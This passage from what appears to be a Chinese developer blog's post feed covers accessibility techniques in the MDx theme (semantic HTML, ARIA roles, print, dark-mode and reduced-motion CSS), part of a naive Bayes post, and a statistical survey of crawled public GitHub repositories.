的准确率哦！</strong>事实上，对于我们的这个例子，就算不设置停用词，我们仍能达到 100% 的分类准确率。朴素贝叶斯分类的确很 NB 呢。</p>\n<h1>更进一步</h1>\n<p>我们的探索到这里就结束了，但如果你有兴趣，完全可以继续探索下去。我们的例子是一个非常简化的例子，在实际情况中，还有很多问题需要解决。比如，对于中文及类似语言，不存在拉丁语系的天然分词结构，而朴素贝叶斯的文本分类是基于单词的，那么<strong>中文的分词就会是个问题；</strong>再比如，对于朴素贝叶斯分类来说，<strong>词语之间的顺序是不影响分类结果的</strong>，但这就会导致“今天心情很好，但昨天不好”和“昨天心情很好，但今天不好”在朴素贝叶斯看来是一样的，要想获得更好的结果，我们必须<strong>考虑词语的顺序。</strong></p>\n<p>这些问题，今天我们就不再深究了，但你可以自己探索。比如，引入思路同样很简洁的马尔科夫链，我们就可以让计算机学会考虑词语间的顺序，不过那就会是另一个话题了。</p>\n","link":"https://flyhigher.top/develop/1989.html"},{"title":"MDx 中增强页面可访问性的细节","date":"2020-01-25 16:45:04","description":"\n<blockquote><p>这篇文章本来是打算发在 <a href=\"https://mdxblog.flyhigher.top/\">MDx Blog</a> 的，不过写到后来发现这篇文章相对来说还是有价值的，于是就将这篇文章转移到了无垠，MDx Blog 则不再发表这篇文章。</p></blockquote>\n<p>从 MDx 开发之初，增强页面的可访问性就被列为了一个重要目标。从 HTML 语义化，到 ARIA 地标，再到 <code>prefers-reduced-motion</code>，随着浏览器对于增强页面可访问性的支持功能越来越多，MDx 也在不断地更新，让更多的人都能毫无困难地浏览、查看由 MDx 渲染的网页。本文会详细说明一些 MDx 中增强页面可访问性的细节，<strong>如果你希望增强自己开发的网页的可访问性，本文可能会对你有所帮助。</strong></p>\n<h1>基础性增强</h1>\n<p>增强可访问性，最重要也是最基础的一点就是 HTML 语义化。通过使用 HTML 5 语义化标签和 ARIA Role 标签，我们可以很方便地<strong>将整个网页在语义上分为几部分，而这将有效地改善屏幕阅读器对网页的分析质量，使视力障碍用户更好地浏览网页。</strong></p>\n<h2>HTML 语义化</h2>\n<p><strong>HTML 语义化属于增强页面可访问性的基础中的基础。</strong>通过使用语义化的 HTML 标签，我们可以方便地为网页中的各部分标记功能而不影响页面样式。随着符合 HTML 5 的现代化网页成为主流，语义化标签已被很大一部分网站所支持，我也不过多赘述了。就举几个常用的“地标性”标签吧：</p>\n<ul>\n<li>\n<code>header</code> 标签标记页眉，默认样式同 <code>div</code>，不要把它和 <code>head</code> 搞混了</li>\n<li>\n<code>main</code> 标签标记页面的主要内容，默认样式同 <code>div</code>\n</li>\n<li>\n<code>article</code> 标签标记文章（在 HTML 5 中它指任何独立或可复用的文本），默认样式同 <code>div</code>\n</li>\n<li>\n<code>footer</code> 标签标记页脚，默认样式同 <code>div</code>\n</li>\n<li>\n<code>nav</code> 标签标记页面导航栏区域，默认样式同 <code>div</code>\n</li>\n<li>\n<code>aside</code> 标签标记侧栏，默认样式同 <code>div</code>\n</li>\n<li>\n<code>section</code> 标签标记“一组内容”，你可以把它看作是划定网页中一块区域的通用标签，默认样式同 <code>div</code>\n</li>\n</ul>\n<p>只要用这些标签替代 <code>div</code> 而不是无脑使用 <code>div</code> 就能提高页面的可访问性。MDx 使用了这些标签来增强页面的可访问性。</p>\n<h2>下一步，ARIA</h2>\n<p>有的时候，出于一些原因，我们没法使用语义化的 HTML 标签，或者没有合适的语义化标签来标记内容，这时候<strong>我们就需要使用 ARIA (Accessible Rich Internet Applications，可访问的富互联网应用)。</strong>ARIA 的基础用法很简单，只要在相应元素上加上 <code>role</code> 属性指定该元素的功能即可。下面是一个简单的例子：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"html\">&lt;div role=\"navigation\"&gt;\r\n  &lt;ul&gt;\r\n    &lt;li&gt;&lt;a href=\"#\"&gt;Page A&lt;/a&gt;&lt;/li&gt;\r\n    &lt;li&gt;&lt;a href=\"#\"&gt;Page B&lt;/li&gt;\r\n    &lt;li&gt;&lt;a href=\"#\"&gt;Page C&lt;/a&gt;&lt;/li&gt;\r\n  &lt;/ul&gt;\r\n&lt;/div&gt;</pre>\n<p>通过 <code>role=\"navigation\"</code>，我们把一个 <code>div</code> 标记为了导航栏区域。实际上，对屏幕阅读器来说，这和 <code>nav</code> 标签在语义上是一致的。上一节中的例子都可以分别用以下 ARIA Role 表示：</p>\n<ul>\n<li><code>role=\"heading\"</code></li>\n<li><code>role=\"main\"</code></li>\n<li><code>role=\"article\"</code></li>\n<li><code>role=\"contentinfo\"</code></li>\n<li><code>role=\"navigation\"</code></li>\n<li><code>role=\"complementary\"</code></li>\n<li><code>role=\"region\"</code></li>\n</ul>\n<p>除此以外，MDx 还使用了 <code>role=\"banner\"</code> 和 <code>role=\"search\"</code> 来分别标记页面中的顶部栏和搜索表单。另外，<strong>有的时候 <code>role</code> 属性还需配合 <code>aria-*</code> 属性一同使用</strong>，具体规则比较复杂，我就不在这里赘述了，具体可参考 <a href=\"https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles\">WAI-ARIA Roles – MDN</a>。</p>\n<h1>媒体查询来帮忙</h1>\n<p>CSS 的媒体查询其实是一个非常强大的特性，<strong>妥善利用其中的一些特性，我们可以在网页外观上大大增强网页的可访问性。</strong>除了已经烂大街的“对浏览器窗口大小”响应的媒体查询，我会介绍 3 个很少有网站充分利用的媒体查询。</p>\n<h2>print</h2>\n<p><code>print</code> 媒体查询其实已经“历史悠久”了，<strong>只要使用 <code>@media print {...}</code> 就可以创建只在打印页面时生效的样式。</strong>通过这种方式，我们可以让页面在打印时应用一套为打印优化的样式，增强页面在物理纸张上的可访问性。</p>\n<blockquote><p>维基百科是对打印样式做了单独适配的著名例子。</p></blockquote>\n<p><strong>由于在打印的情况下，页面已经离开了“可交互”的范围，还有分页这种在屏幕中无需考虑的问题，要让页面在物理纸张上仍能被轻松地阅读，我们需要做一些特殊的适配。</strong>直接来看一个例子吧。以下是 MDx 针对打印情况进行的一些特殊优化，样式的具体理由已经写在了注释中。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"css\">@media print {\r\n    /*隐藏不必要的元素*/\r\n    header, .mdx-ad-after-article, .mdx-ad-in-article, .mdx-post-money, .page-footer-nav, .mdx-same-posts, .spanout button, .mdui-drawer, .mdui-overlay, .mdui-menu, .mdx-share-img-dialog, .mdx-share-wechat-dialog {\r\n        display: none!important;\r\n    }\r\n\r\n    /*使用下划线标记链接*/\r\n    article a {\r\n        text-decoration: underline!important;\r\n    }\r\n    /*由于纸张不可交互，在链接后显示链接到的 URL*/\r\n    article a::after {\r\n        content: \"(\" attr(href) \")\";\r\n    }\r\n\r\n    /*强制白底黑字*/\r\n    html &gt; body {\r\n        background-color: white!important;\r\n    }\r\n    article p {\r\n        color: rgba(0,0,0,.8)!important;\r\n    }\r\n\r\n    /*对于纸张上的长文章，衬线字体拥有更好的可读性。以下字体列表来自 fonts.css*/\r\n    article {\r\n        font: 13pt Georgia, \"Nimbus Roman No9 L\", \"Songti SC\", \"Noto Serif CJK SC\", \"Source Han Serif SC\", \"Source Han Serif CN\", STSong, \"AR PL New Sung\", \"AR PL SungtiL GB\", NSimSun, SimSun, \"TW\\-Sung\", \"WenQuanYi Bitmap Song\", \"AR PL UMing CN\", \"AR PL UMing HK\", \"AR PL UMing TW\", \"AR PL UMing TW MBE\", PMingLiU, MingLiU, serif!important;\r\n    }\r\n\r\n    /*除部分元素外，禁止在元素内部分页*/\r\n    * {\r\n        page-break-inside: avoid;\r\n    }\r\n    article p, article a, #comments, article {\r\n        page-break-inside: auto;\r\n    }\r\n}</pre>\n<p>MDx 自 1.9.3 版本起已经包含了对文章页的打印样式优化。可以很容易地看出，优化后的样式在物理纸张上将更容易阅读。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/6.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/6.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1345\" height=\"1602\" class=\"aligncenter size-full wp-image-1959\"></a>\n<h2>prefers-color-scheme</h2>\n<p><code>prefers-color-scheme</code> 是最近才被浏览器广泛支持的一个媒体查询，但它的功能却很强大：<strong>响应系统级黑暗模式。</strong>这样，我们可以在开启黑暗模式的系统中让网页具有更好的可读性。不过由于这个媒体查询直到最近才被广泛支持，因此大部分网站对此并没有进行适配。</p>\n<blockquote><p>一些适配这一特性的网站：少数派、微信公众平台（文章页）等。</p></blockquote>\n<p>通过像这样的媒体查询，我们可以在系统启用黑暗模式时让页面实时响应：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"css\">@media (prefers-color-scheme: dark) {\r\n    body {\r\n        background-color: #212121;\r\n        color: rgba(255, 255, 255, .7);\r\n    }\r\n}</pre>\n<p><code>prefers-color-scheme</code> 一共有 3 个可能值：<code>no-preference</code>, <code>light</code> 和 <code>dark</code>。你也可以不像上面的例子那样默认使用亮色样式并在黑暗模式下启用黑暗样式，而可以反过来将黑暗样式作为默认，用亮色样式覆盖。在不支持的浏览器上将会显示默认样式（即媒体查询不会生效）。</p>\n<p>MDx 已经在 1.9.6 版本中包含对这一媒体查询的支持。</p>\n<h2>prefers-reduced-motion</h2>\n<p>看名字就猜得出，<code>prefers-reduced-motion</code> 是和 <code>prefers-color-scheme</code> 师出同门的媒体查询。因此，和 <code>prefers-color-scheme</code> 一样，它也是在最近才获得了浏览器的广泛支持。它的作用也很强大：<strong>响应系统的“减弱动态效果”模式。</strong>这对某些不喜欢甚至无法接受动画的用户可能很有帮助。要知道，对有些用户来说这甚至是医疗上的必要。使用如下的媒体查询，我们可以在系统启用减弱动态效果模式时让页面实时响应，减弱动画：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"css\">@media (prefers-reduced-motion: reduce) {\r\n    /*只是一个示例，实际情况中可以保留一些淡入淡出效果*/\r\n    * {\r\n        transition: all 0s!important;\r\n        transform: none!important;\r\n    }\r\n}</pre>\n<p><code>prefers-reduced-motion</code> 只有 2 个可能值：<code>no-preference</code> 和 <code>reduce</code>，在不支持的浏览器上该媒体查询不会生效。</p>\n<p>MDx 已经在 1.9.6 版本中包含对这一媒体查询的支持。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/5.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/5.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"792\" height=\"515\" class=\"aligncenter size-full wp-image-1962\"></a>\n<h1>黑暗模式适配</h1>\n<p>黑暗模式可不是简单地切换到黑底白字这么简单。<strong>单纯地使用黑底白字会导致页面元素之间对比度过高，文字刺眼，反而降低了页面的可访问性。</strong>我在下面总结了几条应用在了 MDx 中的黑暗模式优化规则和 Google 推荐的优化规则：</p>\n<p><strong>一是避免黑底白字。</strong>黑底白字看起来真的很难受，事实上，深灰和浅灰是黑暗模式最好的配色。比较下方例子里的两段文本，毫无疑问深灰色背景和浅灰色文字搭配的样式的可读性要比黑底白字高很多。（p.s. 有时候这条规则在白底黑字时也适用）</p>\n<p><strong>二是更改部分元素的亮度和对比度以增强可读性。</strong>你可能已经注意到了，下面优化的例子里标题文字的颜色改变了。很明显，未优化的黑暗模式中标题可读性不如优化的版本。在实际中，我们通常可以通过 CSS 滤镜来实现这一更改。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"css\">@media (prefers-color-scheme: dark) {\r\n    h1 {\r\n        /*反相颜色后再将色相旋转 180 度，使亮度反相*/\r\n        filter: invert(1) hue-rotate(180deg);\r\n    }\r\n}</pre>\n<p><strong>三是避免让图片过亮。</strong>未经处理的图片通常会导致过高的对比度，降低可读性。在 MDx 中，我选择降低图片的亮度来避免图片刺眼，而 Google 的建议则是使图片灰度，不过这会影响图片的整体观感。无论是哪一种方案，都可以使用 CSS 滤镜来轻松实现。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"css\">@media (prefers-color-scheme: dark) {\r\n    img { \r\n        /*MDx 方案*/\r\n        filter: brightness(.8);\r\n        /*Google 方案*/\r\n        filter: grayscale(.5);\r\n    }\r\n}</pre>\n<div>\n<div>\n<h1>Cats\n</h1>\n<p>这里是未优化的黑暗模式预览。接下来，让我们来看点可爱的猫猫吧。</p>\n<p><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/demo.jpg?x-oss-process=image/interlace,1/quality,Q_90#\"></p>\n</div>\n<div>\n<h1>Cats\n</h1>\n<p>这里是经过优化的黑暗模式预览。接下来，让我们来看点可爱的猫猫吧。</p>\n<p><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/demo.jpg?x-oss-process=image/interlace,1/quality,Q_90#\"></p>\n</div>\n</div>\n<h1>其他细节</h1>\n<p>还有一些细节，虽然简单，但不可或缺。我把一部分没有在上文提到的 MDx 中的细节列在了这里。</p>\n<p><strong>一是允许页面缩放。</strong>在开发响应式页面时，很多网站会在页面头部添加这样一个 <code>meta</code>：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"html\">&lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no\"&gt;</pre>\n<p>这样的 <code>meta</code> 设定了页面的宽度，却也固定了页面的缩放比例，用户难以手动放大网页。<strong>这样的设置对一部分视力障碍用户非常不友好</strong>，以至于苹果决定在自家的浏览器上忽略禁止缩放的 <code>meta</code>。按照 Google 的推荐，如果你在 MDx 设置中启用了“允许页面缩放”，那么 MDx 会输出这样的 <code>meta</code> 标签，允许页面进行五倍以内的缩放：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"html\">&lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1, maximum-scale=5\"&gt;</pre>\n<p><strong>尽管很多时候放大页面会导致页面结构被破坏，但这大大增强了页面的可访问性，利大于弊。</strong>因此，在 MDx 中，“允许页面缩放”是默认启用的。</p>\n<p><strong>二是在跨设备阅读时同步阅读记录。</strong>这属于 MDx 的“元老级”功能之一。注意到页面右上角的那个“在其他设备上继续阅读”的按钮了吗？如果你滚动页面后重新点击它，你会发现二维码发生变化了。通过在二维码中记录阅读进度，用户在扫描二维码切换设备阅读时，MDx 在新设备上会自动滚动到和原设备上一致的位置——好吧，目前基于百分比的算法在某些情况下可能不太准，但我已经设计了一个更复杂但更精确的阅读进度记录算法，之后就会更新到 MDx 中。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/8.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/8.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1000\" height=\"574\" class=\"aligncenter size-full wp-image-1976\"></a>\n<p><strong>三是避免 Web 字体阻塞渲染。</strong>如果你在页面中使用了 Web 字体，在字体加载完成之前，浏览器可能不会渲染任何文本，这就导致用户可能需要等待一段时间才能开始浏览网页。Google 推荐使用 <code>font-display: swap;</code> 来向浏览器指定网页的 Web 字体渲染策略。这一规则会提供一个比较短的等待周期，如果在这段时间内 Web 字体没有完成加载，那么浏览器会以 fallback 字体渲染文本。任意时刻一旦 Web 字体完成渲染，浏览器就会使用 Web 字体重新渲染文本。这在大多数情况下都能满足可访问性的需求。</p>\n<p><strong>四是确保 html 元素具有合适的 <code>lang</code> 属性。</strong>这一属性声明了页面的主要语言，浏览器可以据此调整渲染策略，或者触发自动翻译；屏幕阅读器也能更好地阅读网页。</p>\n<p><strong>五是确保页面主要内容在丢失/禁用了 Javascript 甚至 CSS 的情况下仍然可用。</strong>作为一个以内容为主的网站，MDx 在禁用了 Javascript 的情况下页面主要内容仍然可用。这不只是为了 SEO，更是为了保证页面的可访问性。的确，目前的情况下，如果开启了 Lazyload，MDx 在禁用 Javascript 的情况下图片的确无法显示，但我会在后续版本中尽可能的优化这一问题。</p>\n<h1>附录：媒体查询开发技巧</h1>\n<p>有的时候，光有 CSS 响应媒体查询还不够，我们可能需要在 Javascript 中实时响应媒体查询。用如下代码就可以很简单地响应媒体查询：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">let mql = window.matchMedia(\"(prefers-reduced-motion: reduce)\");\r\nmql.addListener(handleMediaChange);\r\n\r\n//在添加监听后先调用一次，获得当前查询结果\r\nhandleMediaChange(mql);\r\n\r\nfunction handleMediaChange(mql){\r\n    if(mql.matches){\r\n        //查询匹配\r\n    }else{\r\n        //查询不匹配\r\n    }\r\n}</pre>\n<p>在开发上述媒体查询的过程中，我们需要频繁地切换系统的相应模式或者调出打印窗口。<strong>实际上，Chrome 提供了更简单的调试方法：</strong></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/2333.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1946\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/2333.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"723\" height=\"681\"></a>\n<p>只要在这里更改模式，相关媒体查询就能实时生效。这不会影响其他标签页，在关闭开发者工具之后也会自动恢复系统设置。</p>\n","link":"https://flyhigher.top/develop/1912.html"},{"title":"MDx Blog 现已随 MDx 1.9.5 发布","date":"2020-01-22 17:54:11","description":"<p>随着 MDx 发布 1.9.5 更新，<a href=\"https://mdxblog.flyhigher.top/\" rel=\"noopener noreferrer\" target=\"_blank\">MDx Blog</a> 现已建立。我将会在 MDx Blog 中分享一些开发故事并发布 MDx 更新日志。</p>","link":"https://flyhigher.top/diary/1905.html"},{"title":"GitHub 2019 统计无垠版","date":"2020-01-12 13:02:00","description":"\n<h1>缘起</h1>\n<p>2019 年底，我突发奇想想要自己统计一番 GitHub 上存储库的一些信息。尽管 GitHub 有自己的<a href=\"https://octoverse.github.com/\" target=\"_blank\" rel=\"noopener noreferrer\">年度统计</a>，我还是想试着自己爬取一下，说不定能挖出什么有意思的信息，何况这是我第一次有机会处理比较大量的数据，也算是一种学习的过程吧。于是花了一下午写了个简单的爬虫（时间都花在增加 Rate Limit 上了…），然后扔在了两台服务器上开始跑（GitHub  API 真是好文明）。</p>\n<p>从 2019.11.21 3 时到 2020.1.12 24 时的 52 天 21 小时内，我的爬虫一共爬取了<strong>与 2,024,705 个用户有关<sup>*</sup>的 14,651,923 个公共存储库的基础信息</strong>，平均每秒爬取 3.2 个存储库。据 GitHub 的官方数据计算，我爬取了大约 15% 的存储库信息，但由于封禁库和私有库的数量未知，我暂时无法确定我爬取的存储库占公共库的比例。同时由于存储库数量较多，基本可以认为爬取到的样本在时间尺度上已经足够随机，可以通过统计得出一般结论。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/1.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/1.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"700\" height=\"606\" class=\"aligncenter size-full wp-image-1892\"></a>\n<p>爬到自己了，合影.jpg</p>\n<p>那么下面就来看看统计出来的一些结果吧。爬虫的技术细节和数据集下载放在文末。</p>\n<p>* 指这些用户拥有至少一个库</p>\n<h1>统计信息</h1>\n<p><strong>以下统计结果均基于已放于文末的数据集。</strong>由于爬虫爬取的时间跨度长，加上我并没有完整爬取 GitHub 所有存储库，因此我<strong>不能保证以下统计结果符合真实情况</strong>，各位可以下载数据集或自行爬取进行验证。</p>\n<h2>一些数据</h2>\n<div>\n<div>\n<div>\n<span>3,120,930</span><br>总爬取用户数</div>\n<div>\n<span>44.7%</span><br>的存储库创建<br>自 Fork</div>\n<div>\n<span>6.59%</span><br>的账户被删除或<br>封禁<sup>1</sup>\n</div>\n<div>\n<span>23,913</span><br>单用户拥有最大<br>库数量<sup>2</sup>\n</div>\n</div>\n</div>\n<p><sup>1</sup> 基于用户 ID 规律合理推断<br><sup>2</sup> 统计范围仅限于当前数据集</p>\n<p>比较出乎我意料的是创建自 Fork 的存储库的占比。我预估这样的存储库占比不会太低，但没有想到能接近一半。此外单用户拥有最大库数量也大大超出了我的预期，<a href=\"https://github.com/pombredanne\" rel=\"noopener noreferrer\" target=\"_blank\">pombredanne</a> 这个用户名下拥有将近 24k 的存储库，不过绝大多数都是 Fork 来的，在情理之中。此外<strong>这个数据集中</strong>拥有最多存储库的账户其实是一个组织 <a href=\"https://github.com/gitpan\" rel=\"noopener noreferrer\" target=\"_blank\">gitpan</a>，这个组织拥有 36,377 个存储库。</p>\n<h2>语言</h2>\n<p><canvas></canvas><br>\n首先必须要说明的是，在这个榜单中我<strong>排除了 HTML 和 CSS</strong>，因为在严格意义上它们不属于“编程语言”。如果把它们计算进来的话，分别有 640,368 个和 361,425 个存储库的主要语言分别是 HTML 和 CSS，这样在这份榜单中它们可以排到第 6 和 第 10 名。JavaScript 毫无疑问获得第一，第二名 Python 的热度则和 JavaScript 相差将近一半。<strong>此外还有 2,448,486 个存储库未能识别出语言，占比 16.7%。</strong>在上面的榜单之外，与机器学习和数据科学相关的语言还有 Jupyter Notebook 排名第 13，R 排名 20，Julia 排名 43。</p>\n<p>说实话这份排名和 GitHub 官方的排名<strong>差别很大</strong>，除了前三名，后面的基本都不太一样。我的排名统计结果完全基于 GitHub 对于存储库的主要语言识别，加上我的存储库数据不完整，和官方的数据不同是很正常的，可以做一个参考，但大概率还是官方排名更加准确。</p>\n<h2>许可证</h2>\n<p><canvas></canvas></p>\n<p>自 GitHub 推出许可证功能以来，拥有许可证的存储库比例升升降降，却始终没有超过一半。<strong>选择一个合适的许可证对项目的良好发展真的很有帮助</strong>，要了解如何选择合适的许可证，请参阅<a href=\"https://www.runoob.com/w3cnote/open-source-license.html\" rel=\"noopener noreferrer\" target=\"_blank\">这篇文章</a>。</p>\n<p><canvas></canvas></p>\n<p>对于拥有许可证的存储库，MIT<del> 麻省理工许可证 </del>总是占比最大的；第二则是 Apache-2.0 许可证。此外，WTFPL 许可证也挤入了前 15 名。</p>\n<h2>星标</h2>\n<p><canvas></canvas><br>\nStar 数量毫无疑问是一个存储库受欢迎程度的体现，而 Star 数高的项目基本上大家都了解过。<strong>截至爬取结束时间</strong>，GitHub 中 Star 数最多的库是 <a href=\"https://github.com/freeCodeCamp/freeCodeCamp\" rel=\"noopener noreferrer\" target=\"_blank\">freeCodeCamp</a> <del>非常完美的驼峰命名法</del>，其次则是著名项目 <a href=\"https://github.com/996icu/996.ICU\" rel=\"noopener noreferrer\" target=\"_blank\">996.ICU</a>。<a href=\"https://github.com/vuejs/vue\" rel=\"noopener noreferrer\" target=\"_blank\">Vue</a> 现在的 Star 数已经稳压 <a href=\"https://github.com/facebook/react\" rel=\"noopener noreferrer\" target=\"_blank\">React</a> 一头，Vue YES! 此外 <a href=\"https://github.com/sindresorhus/awesome\" rel=\"noopener noreferrer\" target=\"_blank\">awesome</a> 也挤进第七名。<br><canvas></canvas><br>\n由于 Star 需要时间积累，新项目的 Star 数量很可能是比不过老项目的，这就会导致有实力的新项目无法出现在榜单中。因此我还统计了日均 Star 数，试图通过日均 Star 数来反映项目受欢迎的程度。<strong>由于正热门的项目会比老牌热门项目有优势，这一项的统计范围是 2020-01-01 之前的所有存储库。</strong>996.ICU 和 freeCodeCamp 再次出现在前 10 名，而最近的热门项目 <a href=\"https://github.com/wenyan-lang/wenyan\" rel=\"noopener noreferrer\" target=\"_blank\">wenyan</a> 则飙升至第 2 名。此外还有 <a href=\"https://github.com/menzi11/BullshitGenerator\" rel=\"noopener noreferrer\" target=\"_blank\">BullshitGenerator</a>，即最近热门的“狗屁不通文章生成器”和 <a href=\"https://github.com/evil-huawei/evil-huawei\" rel=\"noopener noreferrer\" target=\"_blank\">evil-huawei</a> 分列第 3 和第 5 名。<br><canvas></canvas><br>\n说实话这个曲线<strong>比我预估的陡多了。</strong>你可能已经注意到了，这个图表的横轴不是均匀缩放的，实际上曲线要比看起来陡很多。同时受爬取方式的影响，GitHub 中 Star 数较少的存储库数量远比我爬取到的多。也就是说，<strong>实际情况下曲线远比这个图表上的陡。</strong>拿点 Star 不容易啊。</p>\n<h2>名称</h2>\n<p><canvas></canvas><br>\n终于知道了原来存储库的名称是有长度限制的…尽管最长有 100 位，<strong>大部分人还是喜欢 8 位长的存储库名。</strong>此外 1 位长的名称也比我预估的要多一些。举几个存储库名称长度为 100 的例子吧。</p>\n<ul>\n<li>testing-something-elsetesting-something-elsetesting-something-elsetesting-something-elsetesting-some</li>\n<li>acts_as_validated_config_so_app_will_not_run_in_random_situation_and_qa_gays_will_not_cry_to_you_whe</li>\n<li>……………………………………..________-………………………………-.—……</li>\n<li>—————————————————————————————————-</li>\n<li>nyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyan</li>\n</ul>\n<p>…创造力有够丰富的。</p>\n<p><canvas></canvas></p>\n<p>最近 GitHub 上有一种奇怪的风气，那就是建立 Awesome 合集<del>骗 Star</del>。看起来 Awesome 存储库满地都是，甚至还出现了关于 Awesome 的 Awesome 合集这种迷惑行为。于是我统计了一下，<del>还好，</del>占比<del>才</del> 0.5% 不到<del>，Awesomer 们任重而道远呐</del>。</p>\n<p><canvas></canvas></p>\n<p>尽管要在 github.io 上托管网站，存储库不一定要以 .github.io 结尾，但我还是统计了一下。拥有这类存储库的用户比我预想的要少一些，看来还有很多人没有完全发挥 GitHub 的完整实力啊<del>（比如我 Doge）</del>。同时<strong>这类存储库在所有存储库中占比 1.12%</strong>，看起来不多<del>，不过至少比 Awesome 多</del>。<br><canvas></canvas><br>\n看得出来 GitHub 对于用户名长度的限制是 1-40 位。用户名最短的 27 位占据了 <code>A-Z</code> 外加 <code>-</code> 的所有可能，而用户名最长的则是一个组织 <a href=\"https://github.com/UOIT-RESEARCH-database-information-group\" rel=\"noopener noreferrer\" target=\"_blank\">UOIT-RESEARCH-database-information-group</a>。不知道是巧合还是某种规律，<strong>最受欢迎的用户名长度和存储库名称长度一样，都是 8</strong>，有点意思。</p>\n<h2>创建时间</h2>\n<p><canvas></canvas><br>\n由于我并没有完整爬取所有存储库，我只能以相对值来统计每月新增存储库数量的变化趋势。<strong>在这个图表中，我将 2017-09 的数据设为了 100%。</strong>你一定一眼就能注意到 2017 年 6,7,8 月的“一柱擎天”。<del datetime=\"2020-02-05T09:18:30+00:00\">我第一次看到这个数据的时候的确愣了一下，不过就着这条新闻看就能明白为什么了：<strong>2017 年 6 月微软收购 GitHub。</strong></del></p>\n<blockquote><p>重新确认了一下，微软收购 GitHub 比这个高峰晚了一年，目前我对这个高峰没有什么很好的解释，如果你有什么思路的话欢迎评论。</p></blockquote>\n<p><strong>需要注意的是这张图表中我排除了 Fork 存储库</strong>，因为 Fork 存储库在 API 中的创建时间是原始存储库的时间，会影响整体趋势。此外，GitHub 中还有一个创建于 2007 年 10 月 29 日的存储库，那就是 <code>id: 1</code> 的…</p>\n<div class=\"mdx-github-cot\" data-mdxgithuba=\"mojombo\" data-mdxgithubp=\"grit\" data-mdxgithubg=\"https://api.github.com/\"><div class=\"mdx-github-wait-out-c2\"><div class=\"mdx-github-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://github.com/mojombo/grit\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<p>而它的创建者正是 GitHub 的创始人之一 Tom Preston-Werner。</p>\n<h1>一些有趣的结果</h1>\n<p>当初打算自己爬的目的之一就是想看看能不能挖出什么有意思的信息，结果真的有一些不挖不知道的信息。</p>\n<h2>奇怪的存储库</h2>\n<p>在爬取到的所有存储库中，<strong>有 3 个存储库是“无主”的</strong>，即它们的 owner 属性为空。这三个存储库的基本信息如下。</p>\n<div class=\"mdui-table-fluid mdui-table-hoverable\"><table class=\"mdui-table\">\n<thead><tr>\n<th>ID</th>\n<th>名称</th>\n<th>Forked</th>\n<th>Star</th>\n<th>语言</th>\n<th>许可证</th>\n<th>创建于</th>\n</tr></thead>\n<tbody>\n<tr>\n<td>72385291</td>\n<td>vscode-redprl</td>\n<td>否</td>\n<td>10</td>\n<td>TypeScript</td>\n<td>apache-2.0</td>\n<td>2016-10-31 08:50:01</td>\n</tr>\n<tr>\n<td>181218346</td>\n<td>electron-sys</td>\n<td>否</td>\n<td>10</td>\n<td>Rust</td>\n<td>other</td>\n<td>2019-04-14 03:20:56</td>\n</tr>\n<tr>\n<td>181391880</td>\n<td>node-sys</td>\n<td>否</td>\n<td>6</td>\n<td>Rust</td>\n<td>other</td>\n<td>2019-04-15 09:33:08</td>\n</tr>\n</tbody>\n</table></div>\n<p><strong>更奇怪的是这三个存储库“无主”的情况还不一样。</strong>第一个存储库可以通过 <code>/repositories</code> 这个 GitHub API 找到， <a href=\"https://api.github.com/repositories?since=72385290\" target=\"_blank\" rel=\"noopener noreferrer\">这个链接</a>中的第一个存储库就是它；而其余两个存储库甚至无法在 <code>/repositories</code> API 中找到。不过就算能在 API 中找到第一个存储库，它的 <code>html_url</code>，即 <code>https://github.com//vscode-redprl</code> 仍然是不可访问的。这可能是 GitHub 早期的一个 Bug 导致的，不过我仍然对爬虫是如何找到这三个存储库的以及这些 Stars 是哪里来的感到好奇。</p>\n<h2>奇怪的用户名</h2>\n<p>在爬虫爬了一段时间以后，API 中突然开始出现大量的以 fdp 开头的 18 位乱码作为用户名的用户。这些用户拥有的存储库和 starred 的存储库都为 0，而他们的 <code>html_url</code> 为 404。以下是几个例子。</p>\n<ul>\n<li>fdpEpolGCEdQX4ZlRJ</li>\n<li>fdp8XaVrdtmDZnO5pR</li>\n<li>fdp8XRAGnwAOkTr2Ya</li>\n</ul>\n<p>由于我的爬虫并没有超过 Rate Limit，所以我排除了这是污染数据的可能。我怀疑这可能是某种 Bot 